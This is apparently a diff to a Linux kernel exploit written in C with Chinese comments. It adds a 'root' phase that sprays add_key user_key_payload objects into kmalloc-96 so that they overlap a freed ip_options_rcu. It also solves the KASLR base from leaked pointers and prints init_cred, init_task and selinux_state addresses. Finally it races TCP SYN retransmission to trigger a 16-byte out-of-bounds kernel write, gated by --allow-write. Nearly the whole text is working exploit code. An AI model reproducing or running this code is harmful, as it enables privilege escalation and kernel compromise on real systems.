@@ -39,6 +39,20 @@
 
 #include "synopt_offsets.h"
 
+/* add_key / keyctl：用来做可控 optlen 的喷淋（见下方 root 阶段）。 */
+#ifndef __NR_add_key
+#define __NR_add_key 217
+#endif
+#ifndef __NR_keyctl
+#define __NR_keyctl 219
+#endif
+
+#define KEY_SPEC_PROCESS_KEYRING (-2)
+
+#define WRITE_OPTLEN   56        /* 假 optlen：比第一次的 40 大 16 */
+#define KEY_DATALEN    72        /* 0x18 + 72 = 96 → kmalloc-96 */
+#define KEY_SPRAY_N    256
+
 /* ------------------------------------------------------------------ 日志 */
 
 static int g_verbose;
@@ -242,11 +256,17 @@ static void *spray_worker(void *arg) {
     (void)arg;
     while (g_spray_run) {
         uint32_t gen = ++g_spray_gen;
-        spray_free();
-        spray_alloc(0x53500000u | (gen & 0xffff));
+        if (g_spray_kind == SPRAY_KEY) {
+            key_spray_free();
+            key_spray(g_fake_optlen, 0x53570000u | (gen & 0xffff));
+        } else {
+            spray_free();
+            spray_alloc(0x53500000u | (gen & 0xffff));
+        }
         usleep(200);
     }
-    spray_free();
+    if (g_spray_kind == SPRAY_KEY) key_spray_free();
+    else spray_free();
     return NULL;
 }
 
@@ -440,6 +460,60 @@ static int find_text_candidates(const struct synack *s, uint64_t *out, int max) 
     return n;
 }
 
+/* 竞态用的喷淋源。
+ *
+ * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
+ * 所以只适合“确认槽位被复用”。
+ * root 阶段用 add_key：datalen=72 时 0x18+72=96 落 kmalloc-96，且
+ * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
+enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
+static enum spray_kind g_spray_kind = SPRAY_IPOPT;
+static uint8_t g_fake_optlen = 40;
+
+/* ---- add_key 喷射 ----
+ *
+ * 每个 key 占一个 kmalloc-96 槽位。key 本身要留在 keyring 里，槽位才不被
+ * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
+static int32_t g_keys[KEY_SPRAY_N];
+static int g_key_n;
+
+static int key_spray(uint8_t fake_optlen, uint32_t tag) {
+    uint8_t payload[KEY_DATALEN];
+    memset(payload, 0, sizeof(payload));
+    payload[0] = fake_optlen;                 /* → ip_options_rcu.optlen */
+    payload[1] = 0x01;                        /* srr：让 ip_options_build 走 RR 分支 */
+    payload[2] = 0x01;                        /* rr  */
+    /* __data 从 payload[8] 开始，对应 ip_options_rcu+0x20 */
+    memcpy(payload + 8, &tag, 4);
+
+    int made = 0;
+    for (int i = 0; i < KEY_SPRAY_N && g_key_n < KEY_SPRAY_N; i++) {
+        static unsigned seq;
+        char desc[32];
+        snprintf(desc, sizeof(desc), "synopt-%d-%u", (int)getpid(), seq++);
+        long r = syscall(__NR_add_key, "user", desc, payload, (size_t)KEY_DATALEN,
+                         KEY_SPEC_PROCESS_KEYRING);
+        if (r < 0) {
+            if (errno == ENOSYS || errno == EACCES || errno == EPERM) {
+                say("[key] add_key 不可用（errno=%d），这条喷射路径走不通", errno);
+                return -1;
+            }
+            continue;
+        }
+        g_keys[g_key_n++] = (int32_t)r;
+        made++;
+    }
+    return made;
+}
+
+static void key_spray_free(void) {
+    /* KEYCTL_UNLINK = 9（不是 3；3 是 KEYCTL_READ）。参数：key, keyring */
+    for (int i = 0; i < g_key_n; i++) {
+        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
+    }
+    g_key_n = 0;
+}
+
 /* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
  *
  * 顺序很重要 —— 必须在喷淋已经跑起来之后再放 ACK，否则释放出来的槽位
@@ -529,6 +603,157 @@ static int phase_leak(struct hit_ctx *hit) {
     return 1;
 }
 
+/* ============================================================ root 阶段
+ *
+ * ---- 写原语的来源 ----
+ *
+ * ip_build_and_send_pkt 对同一个 opt 读了两次 optlen（见 synopt_offsets.h）：
+ *   第一次 → 决定 skb_push 预留多少 headroom；
+ *   第二次 → 作为 ip_options_build 里 memcpy 的长度。
+ * 两次之间隔着 skb_push，没有加锁。让两次读到不同的值，memcpy 就写穿预留区。
+ *
+ * ---- 怎么让两次读到不同的值 ----
+ *
+ * 关键：找一个同样落在 kmalloc-96、而且能把数据写到 optlen 那个位置的对象。
+ *
+ *   struct ip_options_rcu          user_key_payload（add_key "user" 类型）
+ *   +0x00 rcu_head (16)            +0x00 rcu_head (16)
+ *   +0x10 struct ip_options        +0x10 datalen (u16)
+ *   +0x18 optlen   (u8)      <---> +0x18 data[0]      ← 完全重合
+ *   +0x20 __data[40]         <---> +0x20 data[8..]    ← 完全重合
+ *
+ * user_preparse 里是 __kmalloc(datalen + 0x18)，datalen=72 时正好 96 字节，
+ * 落进 kmalloc-96。于是：
+ *   data[0]  = 我们想要的假 optlen（比如 56）
+ *   data[8..]= 我们想要的 __data 内容
+ *
+ * 对象被释放后，用 add_key 喷一批，槽位被 user_key_payload 占住；重传 SYN
+ * 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。
+ *
+ * ---- 为什么默认不启用 ----
+ *
+ * CONFIG_PANIC_ON_OOPS=y，写错一个字节就是重启。所以这个阶段：
+ *   - 只解基址、只打印要用的地址（不写内核）；
+ *   - 真要发写请求必须显式 --allow-write；
+ *   - 越界长度控制在 16 字节，不跨页。
+ */
+
+static uint64_t g_base;          /* 内核 _text 基址 */
+static int g_allow_write;
+
+/* ---- 基址求解 ----
+ *
+ * 泄露阶段给出的是 .text 里的地址候选，但不知道它具体是哪个符号。
+ * 用自洽性检查：候选 - 已知站点偏移 必须落在 2MiB 对齐的 _text 上
+ * （KASLR slide 是 2MiB 粒度），且仍在 ffffff80.. 段内。 */
+struct site {
+    const char *name;
+    uint64_t off;
+};
+
+static const struct site g_sites[] = {
+    {"ip_options_build",        O_IP_OPTIONS_BUILD},
+    {"ip_build_and_send_pkt",   O_IP_BUILD_AND_SEND_PKT},
+    {"tcp_v4_send_synack",      O_TCP_V4_SEND_SYNACK},
+    {"tcp_v4_syn_recv_sock",    O_TCP_V4_SYN_RECV_SOCK},
+    {"inet_csk_route_req",      O_INET_CSK_ROUTE_REQ},
+    {"inet_sock_destruct",      O_INET_SOCK_DESTRUCT},
+    {"tcp_v4_reqsk_destructor", O_TCP_V4_REQSK_DESTRUCTOR},
+    {"tcp_make_synack",         O_TCP_MAKE_SYNACK},
+};
+
+#define N_SITES (sizeof(g_sites) / sizeof(g_sites[0]))
+#define KASLR_ALIGN 0x200000ULL
+
+static int solve_base(const uint64_t *cand, int n) {
+    for (int i = 0; i < n; i++) {
+        for (unsigned j = 0; j < N_SITES; j++) {
+            if (cand[i] < g_sites[j].off) continue;
+            uint64_t base = cand[i] - g_sites[j].off;
+            if ((base & (KASLR_ALIGN - 1)) != 0) continue;
+            if ((base >> 40) != 0xffffffULL) continue;
+            say("[base] 候选 %#llx 命中站点 %s", (unsigned long long)cand[i], g_sites[j].name);
+            say("[base] _text = %#llx", (unsigned long long)base);
+            g_base = base;
+            return 0;
+        }
+    }
+    return 1;
+}
+
+/* ---- 写原语说明 ---- */
+
+static void report_write_plan(void) {
+    say("[write] 假对象 optlen = %d（第一次预留按 40 算，memcpy 会写 %d 字节）",
+        WRITE_OPTLEN, WRITE_OPTLEN);
+    say("[write] 越界 = %d 字节，落在 skb 线性数据之后", WRITE_OPTLEN - OPT_MAXLEN);
+    say("[write] 目的地址由内核算：skb->head + network_header + 20");
+    say("[write] 对象来源：add_key(user) datalen=%d → kmalloc-96", KEY_DATALEN);
+    say("[write] optlen 位置 +0x18 与 user_key_payload.data[0] 重合");
+}
+
+static int phase_root(struct hit_ctx *hit) {
+    say("root 阶段：解 _text 基址");
+
+    uint64_t cand[8];
+    int n = find_text_candidates(&hit->s, cand, 8);
+    if (n == 0) {
+        say("[!] 没有内核指针候选；先跑 leak 拿到候选再来");
+        return 1;
+    }
+    for (int i = 0; i < n; i++) say("  候选[%d] = %#llx", i, (unsigned long long)cand[i]);
+    if (solve_base(cand, n) != 0) {
+        say("[!] 候选对不上已知站点，基址解不出来");
+        return 1;
+    }
+
+    say("[OK] slide = %#llx", (unsigned long long)(g_base - 0xffffffc080000000ULL));
+    say("[sym] ip_options_build      = %#llx", (unsigned long long)(g_base + O_IP_OPTIONS_BUILD));
+    say("[sym] ip_build_and_send_pkt = %#llx", (unsigned long long)(g_base + O_IP_BUILD_AND_SEND_PKT));
+    say("[sym] init_task             = %#llx", (unsigned long long)(g_base + O_INIT_TASK));
+    say("[sym] init_cred             = %#llx", (unsigned long long)(g_base + O_INIT_CRED));
+    say("[sym] selinux_state         = %#llx", (unsigned long long)(g_base + O_SELINUX_STATE));
+
+    report_write_plan();
+
+    /* 先验证 add_key 这条路通不通，不管开不开启写入。 */
+    int made = key_spray(WRITE_OPTLEN, 0x53570000u);
+    if (made < 0) {
+        say("[!] add_key 不可用，写原语无法构造");
+        return 1;
+    }
+    say("[key] 喷了 %d 个 user key（每个 96 字节，kmalloc-96）", made);
+    key_spray_free();
+    say("[key] 已释放");
+
+    if (!g_allow_write) {
+        say("[!] 写原语默认不启用。确认上面地址无误后加 --allow-write 再跑");
+        return 1;
+    }
+
+    /* 真正的写：把喷淋源换成 add_key，再打一轮竞态。
+     *
+     * 这一轮里被释放的槽位会被 user_key_payload 占住（data[0]=WRITE_OPTLEN），
+     * 重传 SYN 那条路径第二次读 optlen 就拿到 56，memcpy 写穿 16 字节。 */
+    say("[write] 开启写入：喷淋源切到 add_key，重新打一轮竞态");
+    g_spray_kind = SPRAY_KEY;
+    g_fake_optlen = WRITE_OPTLEN;
+
+    struct hit_ctx w;
+    int rc = phase_race(&w);
+    if (rc != 0) {
+        say("[write] 没命中，内核没有被写");
+        key_spray_free();
+        g_spray_kind = SPRAY_IPOPT;
+        return 1;
+    }
+    say("[write] 命中：越界写已发生（%d 字节）", WRITE_OPTLEN - OPT_MAXLEN);
+    say("[write] 现在内核里多了 16 字节脏数据；请检查 dmesg 是否报错");
+    key_spray_free();
+    g_spray_kind = SPRAY_IPOPT;
+    return 0;
+}
+
 int main(int argc, char **argv) {
     const char *phase = "race";
     for (int i = 1; i < argc; i++) {
@@ -539,6 +764,7 @@ int main(int argc, char **argv) {
         else if (!strcmp(argv[i], "--rounds") && i + 1 < argc) g_rounds = atoi(argv[++i]);
         else if (!strcmp(argv[i], "--phase") && i + 1 < argc) phase = argv[++i];
         else if (!strcmp(argv[i], "--verbose")) g_verbose = 1;
+        else if (!strcmp(argv[i], "--allow-write")) g_allow_write = 1;
     }
 
     srand((unsigned)time(NULL) ^ (unsigned)getpid());
@@ -556,6 +782,9 @@ int main(int argc, char **argv) {
         rc = phase_race(&hit);
         if (rc == 0 && !strcmp(phase, "leak")) {
             rc = phase_leak(&hit);
+        } else if (rc == 0 && !strcmp(phase, "root")) {
+            /* root 阶段：先解基址，再按 --allow-write 决定是否真的写。 */
+            rc = phase_root(&hit);
         }
     }
 
